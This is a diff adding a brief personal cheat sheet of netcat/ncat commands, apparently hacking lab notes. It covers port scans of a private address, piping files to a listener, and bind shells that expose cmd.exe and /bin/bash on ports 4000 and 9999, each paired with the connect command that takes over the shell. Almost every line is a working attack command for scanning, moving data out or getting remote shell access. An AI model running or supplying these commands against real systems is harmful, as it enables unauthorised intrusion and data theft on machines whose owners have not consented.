@@ -1,0 +1,15 @@
+ncat -h
+nc -h
+nc -nvz 192.168.1.7 1-100     ==> for search port . can open
+nc -nv 192.168.1.7 21          => for connect port
+nc -nvz 192.168.1.7 1-3000     => for searching 
+hosthunter -t <ip> -f txt -o tdaskfjl
+ncat -nvlp 4000 ==> for listing and for open port
+......then scanning range enter
+nc -nv <ip> 4000               ==> for open port then listing
+ncat.exe -nvlp 4000 > d:\techchip.txt        ==> for saving data
+nc -nv 192.168.1.7 4000 < text.txt      ==> for sending
+ncat.exe  -nvlp 4000 -e cmd.exe       ==>for sending cmd access
+nc -nv <ip> 4000                    ===> for listing cmd recive access
+nc -nvlp 9999 -e /bin/bash          ===> for open revice bash
+nc -nv <ip> 9999                    ===> for send take access
